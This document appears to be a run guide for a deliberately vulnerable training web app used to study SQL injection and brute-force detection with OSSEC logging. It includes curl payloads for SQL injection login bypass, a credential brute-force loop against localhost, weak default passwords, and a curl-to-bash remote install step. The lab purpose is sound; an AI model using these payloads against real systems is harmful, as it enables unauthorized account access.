# 🚀 RUN GUIDE - SQLi BruteForce Attack Detection

## 📋 **Prerequisites**

### System Requirements
- **Node.js**: 18.x or higher
- **npm/pnpm**: Latest version
- **OS**: Windows, macOS, or Linux
- **RAM**: 2GB minimum
- **Storage**: 1GB free space

### Quick Check
```bash
node --version  # Should be v18.x+
npm --version   # Should be v9.x+
```

## ⚡ **Quick Start (3 Steps)**

### 1. Clone Repository
```bash
git clone https://github.com/TuanDepChai/sqli-bruteforce-attack.git
cd sqli-bruteforce-attack
```

### 2. Install Dependencies
```bash
npm install
# or
pnpm install
```

### 3. Start Application
```bash
npm run dev
```

### 4. Access Application
- **Web Interface**: http://localhost:3000
- **Admin Dashboard**: http://localhost:3000/admin
- **Help Documentation**: http://localhost:3000/help

## 🎯 **Default Credentials**

| Username | Password | Role | Department |
|----------|----------|------|------------|
| `admin` | `admin123` | System Administrator | IT |
| `user` | `password` | Sales Representative | Sales |
| `john` | `john2024` | Software Engineer | Engineering |
| `sarah` | `sarah!pass` | Marketing Manager | Marketing |
| `mike` | `mike123` | Financial Analyst | Finance |
| `emma` | `emma2024` | HR Manager | HR |

## 🧪 **Testing Attacks**

### Automated Testing

#### Windows (PowerShell)
```powershell
.\scripts\test-attacks-windows.ps1
```

#### Linux/macOS (Bash)
```bash
chmod +x scripts/test-attacks-linux.sh
./scripts/test-attacks-linux.sh
```

### Manual Testing

#### 1. Normal Login
```bash
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'
```

#### 2. SQL Injection - Authentication Bypass
```bash
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"anything"}'
```

#### 3. SQL Injection - Comment Bypass
```bash
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":""}'
```

#### 4. Brute Force Test
```bash
# Test multiple credentials
for user in admin user john; do
  for pass in password 123456 admin123; do
    curl -X POST http://localhost:3000/api/login \
      -H "Content-Type: application/json" \
      -d "{\"username\":\"$user\",\"password\":\"$pass\"}"
    sleep 0.5
  done
done
```

## 📊 **Monitoring & Logs**

### Real-time Log Monitoring
```bash
# Watch all attacks
tail -f logs/attacks.log

# Watch SQL injection only
tail -f logs/sql_injection.log

# Watch brute force only
tail -f logs/brute_force.log

# Watch critical attacks
tail -f logs/critical-attacks.log

# Watch multiple files
tail -f logs/*.log
```

### Log Analysis Commands
```bash
# Count total attacks
grep -c "ATTACK_ATTEMPT" logs/attacks.log

# Count successful attacks
grep -c "SUCCESS.*: YES" logs/attacks.log

# Find attacks from specific IP
grep "IP ADDRESS.*192.168" logs/attacks.log

# Find SQL injection attempts
grep "ATTACK TYPE.*sql_injection" logs/attacks.log

# Count attacks by type
grep "ATTACK TYPE" logs/attacks.log | sort | uniq -c

# Get attack statistics
echo "Total attacks: $(grep -c 'ATTACK_ATTEMPT' logs/attacks.log)"
echo "Successful: $(grep -c 'SUCCESS.*: YES' logs/attacks.log)"
echo "SQL Injection: $(grep -c 'sql_injection' logs/attacks.log)"
echo "Brute Force: $(grep -c 'brute_force' logs/attacks.log)"
```

### Database Queries
```bash
# Check database (if sqlite3 installed)
sqlite3 vulnerable.db "SELECT COUNT(*) FROM attack_logs;"
sqlite3 vulnerable.db "SELECT COUNT(*) FROM users;"
sqlite3 vulnerable.db "SELECT * FROM attack_logs ORDER BY timestamp DESC LIMIT 5;"
```

## 🛡️ **OSSEC Integration (Production)**

### Ubuntu Server Deployment (192.168.205.100)
```bash
# One-command deployment
curl -sSL https://raw.githubusercontent.com/TuanDepChai/sqli-bruteforce-attack/main/scripts/ossecc-integration.sh | bash

# Manual deployment
git clone https://github.com/TuanDepChai/sqli-bruteforce-attack.git
cd sqli-bruteforce-attack
chmod +x scripts/ossecc-integration.sh
./scripts/ossecc-integration.sh
```

### OSSEC Configuration
- **Agent Installation**: Automatic via script
- **Log Monitoring**: All attack logs monitored
- **Custom Rules**: SQL injection & brute force detection
- **Alert Levels**: 5-13 based on attack severity

## 🎨 **Features Overview**

### UI/UX Features
- ✨ **Particle Background** with dynamic connected nodes
- 🎭 **Animated Gradients** with smooth color transitions
- 🪟 **Glass Morphism** effects with backdrop blur
- 🎯 **Micro-interactions** on all interactive elements
- 📊 **Animated Statistics** with counting effects
- 🔄 **Loading States** with shimmer animations
- 🌊 **Floating Elements** with physics-based movement

### Security Detection Features
- 🛡️ **SQL Injection Detection** (Level 10-13)
- 🔨 **Brute Force Detection** (Level 8-9)
- 📊 **Behavioral Analysis** with frequency tracking
- 🎯 **Pattern Recognition** for attack types
- ⚡ **Real-time Monitoring** with instant alerts
- 🔍 **Advanced Filtering** in admin dashboard

### Logging Features
- 📝 **Multi-file Logging** (attacks, SQLi, brute force, critical)
- 🔄 **Automatic Rotation** at 10MB
- 🕐 **Vietnam Timezone** (UTC+7) timestamps
- 📊 **Complete Field Data** (15+ fields per log)
- 🎯 **OSSEC Compatible** format

## 🔧 **Development Commands**

### Build & Start
```bash
# Development mode
npm run dev

# Production build
npm run build
npm start

# Custom port
PORT=3001 npm run dev

# Linting
npm run lint
```

### Database Operations
```bash
# Reset database
rm vulnerable.db
npm run dev  # Will recreate

# Check database integrity
sqlite3 vulnerable.db "PRAGMA integrity_check;"

# View database schema
sqlite3 vulnerable.db ".schema"

# Vacuum database
sqlite3 vulnerable.db "VACUUM;"
```

## 🚨 **Troubleshooting**

### Common Issues

#### Database Issues
```bash
# Database locked error
rm vulnerable.db
npm run dev  # Will recreate

# Check database integrity
sqlite3 vulnerable.db "PRAGMA integrity_check;"
```

#### Port Issues
```bash
# Port already in use
lsof -i :3000
kill -9 <PID>

# Or use different port
PORT=3001 npm run dev
```

#### Dependencies Issues
```bash
# Clear and reinstall
rm -rf node_modules package-lock.json
npm install

# Rebuild native modules
npm rebuild better-sqlite3

# Check for errors
npm run build
```

#### Log File Issues
```bash
# Logs not being created
mkdir -p logs
chmod 755 logs

# Check log file permissions
ls -la logs/

# Clear old logs
rm logs/*.log
```

### Performance Issues
```bash
# Check database size
ls -lh vulnerable.db

# Check log file sizes
du -sh logs/*

# Archive old logs
tar -czf logs-backup-$(date +%Y%m%d).tar.gz logs/*.log
```

## 📁 **File Structure**

```
sqli-bruteforce-attack/
├── app/                    # Next.js application
│   ├── page.tsx           # Main login page with animations
│   ├── admin/             # Admin dashboard
│   │   ├── page.tsx       # Dashboard interface
│   │   └── loading.tsx    # Loading component
│   ├── help/              # Documentation
│   │   └── page.tsx       # Help page
│   ├── api/               # API routes
│   │   ├── login/         # Login endpoint
│   │   │   └── route.ts   # Login API handler
│   │   └── logs/          # Logs endpoint
│   │       └── route.ts   # Logs API handler
│   ├── layout.tsx         # Root layout
│   └── globals.css        # Global styles
├── components/            # React components
│   ├── ui/                # shadcn/ui components
│   │   ├── button.tsx     # Button component
│   │   ├── input.tsx      # Input component
│   │   ├── card.tsx       # Card component
│   │   └── ...            # Other UI components
│   ├── animated-gradient-bg.tsx    # Animated background
│   ├── glass-card.tsx             # Glass morphism card
│   ├── particle-background.tsx    # Particle system
│   ├── floating-elements.tsx      # Floating animations
│   ├── animated-input.tsx         # Animated inputs
│   ├── interactive-button.tsx     # Interactive buttons
│   ├── loading-animation.tsx      # Loading animations
│   ├── result-display.tsx         # Result display
│   ├── animated-header.tsx        # Animated header
│   └── theme-provider.tsx         # Theme provider
├── lib/                   # Core libraries
│   ├── db.ts              # Database management
│   ├── logger.ts          # Attack logging
│   ├── file-logger.ts     # File logging with rotation
│   ├── animations.ts      # Animation variants
│   └── utils.ts           # Utility functions
├── logs/                  # Attack logs (auto-created)
│   ├── attacks.log        # All attacks
│   ├── sql_injection.log  # SQL injection only
│   ├── brute_force.log    # Brute force only
│   ├── critical-attacks.log # Successful attacks
│   └── security-events.log # Security events
├── scripts/               # Attack examples & deployment
│   ├── attack-examples.ts # Attack scripts
│   ├── test-attacks-windows.ps1 # Windows test script
│   ├── test-attacks-linux.sh # Linux test script
│   └── ossecc-integration.sh # OSSEC deployment
├── styles/                # Additional styles
│   ├── animations.css     # Animation styles
│   └── globals.css        # Global styles
├── ml-analysis/           # Machine learning scripts
│   └── anomaly_detection.py # ML analysis
├── ossec-*.xml           # OSSEC configuration
├── vulnerable.db         # SQLite database (auto-created)
├── package.json          # Dependencies & scripts
├── next.config.mjs       # Next.js configuration
├── tsconfig.json         # TypeScript configuration
├── tailwind.config.js    # Tailwind CSS configuration
└── README.md             # Documentation
```

## 📚 **Documentation Links**

- **Full Documentation**: [README.md](README.md)
- **Quick Start**: [QUICK-START.md](QUICK-START.md)
- **Ubuntu Deployment**: [UBUNTU-WEBSERVER-DEPLOYMENT.md](UBUNTU-WEBSERVER-DEPLOYMENT.md)
- **Research Project**: [RESEARCH-DOCUMENTATION.md](RESEARCH-DOCUMENTATION.md)

## ⚠️ **Important Notes**

- 🎓 **Educational Purpose Only** - Do not deploy to production
- 🔒 **Intentionally Vulnerable** - For security training only
- 🛡️ **Use Responsibly** - Follow ethical guidelines
- 📝 **Comprehensive Logging** - All activities monitored

## 🎯 **Next Steps**

1. **Test Attacks**: Try different SQL injection payloads
2. **Monitor Logs**: Watch real-time attack detection
3. **Admin Dashboard**: Explore filtering and export features
4. **OSSEC Setup**: Configure for production monitoring
5. **AI Integration**: Prepare for unsupervised ML analysis

---

**Ready to start? Run `npm run dev` and visit http://localhost:3000! 🚀**
